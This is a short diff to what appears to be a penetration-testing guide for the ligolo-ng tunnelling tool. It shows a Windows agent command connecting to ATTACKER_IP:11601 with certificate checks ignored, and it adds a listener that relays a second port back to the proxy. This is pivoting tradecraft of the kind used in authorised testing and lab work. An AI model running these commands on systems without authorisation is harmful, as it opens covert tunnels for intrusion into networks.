@@ -44,6 +44,8 @@ sudo ip link set ligolo up
 
 # Windows
 agent.exe -connect ATTACKER_IP:11601 -ignore-cert
+
+ligolo-ng » listener_add --addr 0.0.0.0:11602 --to 127.0.0.1:11601
 ```
 
 ### 3. Set Up the Tunnel (Proxy Console)
